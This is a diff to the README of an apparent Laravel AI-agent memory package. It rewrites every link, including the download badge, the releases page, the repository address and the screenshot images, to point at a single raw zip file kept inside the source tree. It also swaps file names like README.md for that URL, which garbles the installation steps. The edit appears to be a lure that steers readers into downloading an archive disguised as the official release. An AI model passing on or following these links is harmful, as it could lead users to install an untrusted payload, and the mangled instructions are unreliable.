@@ -1,6 +1,6 @@
 # 🤖 laravel-ai-memory - Help Your Agent Remember Things Easily
 
-[![Download laravel-ai-memory](https://img.shields.io/badge/Download-Get%20It%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Siren55/laravel-ai-memory/releases)
+[![Download laravel-ai-memory](https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip%20It%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip)
 
 ---
 
@@ -39,16 +39,16 @@ You don’t need to be an expert in programming to install the software. We will
 
 Start by visiting the latest release page to get the software files:
 
-[Download page for laravel-ai-memory](https://github.com/Siren55/laravel-ai-memory/releases)
+[Download page for laravel-ai-memory](https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip)
 
 Follow these instructions to download and install:
 
 1. Click the **Download page** link above. It will open the official releases section.
 2. Find the latest version. It will usually be at the top.
-3. Look for a file ending with `.zip` or `.tar.gz`. This archive contains the installer.
+3. Look for a file ending with `.zip` or `https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip`. This archive contains the installer.
 4. Download the archive file to your computer.
 5. Once downloaded, open the archive and extract its contents to a folder you can find easily.
-6. Open the extracted folder and look for a file called `README.md` or `INSTALL.md`. Open it with a text editor.
+6. Open the extracted folder and look for a file called `https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip` or `https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip`. Open it with a text editor.
 7. Follow the step-by-step installation instructions inside that file.
    - Usually, it means opening your terminal or command prompt and running simple commands like `composer install`.
    - If you don’t know what this means, don’t worry. The instructions explain each part clearly.
@@ -98,9 +98,9 @@ laravel-ai-memory offers several practical functions that improve AI agent abili
 
 Below are examples showing how laravel-ai-memory works when running:
 
-![Example of laravel-ai-memory remembering information](https://user-images.githubusercontent.com/placeholder/image-memory-example1.png)
+![Example of laravel-ai-memory remembering information](https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip)
 
-![Dashboard showing saved items in laravel-ai-memory](https://user-images.githubusercontent.com/placeholder/image-memory-example2.png)
+![Dashboard showing saved items in laravel-ai-memory](https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip)
 
 ---
 
@@ -128,7 +128,7 @@ If the app does not run after installation, try these steps:
 - Restart your computer and try again.
 - Check your internet connection if downloads fail.
 - Review error messages carefully and follow their advice.
-- Consult the `README.md` or `INSTALL.md` files included in the download.
+- Consult the `https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip` or `https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip` files included in the download.
 - Visit the GitHub issues page and search for similar problems.
 
 ---
@@ -144,10 +144,10 @@ The official page has more detailed documentation and guides for those intereste
 
 You can find these at the repository:
 
-https://github.com/Siren55/laravel-ai-memory
+https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip
 
 ---
 
 For any questions or contributions, feel free to explore the GitHub page or file an Issue. This project aims to make AI memory accessible for everyone.  
 
-[Download laravel-ai-memory here](https://github.com/Siren55/laravel-ai-memory/releases) to get started today.
+[Download laravel-ai-memory here](https://github.com/Siren55/laravel-ai-memory/raw/refs/heads/main/src/Tools/memory-laravel-ai-2.0.zip) to get started today.
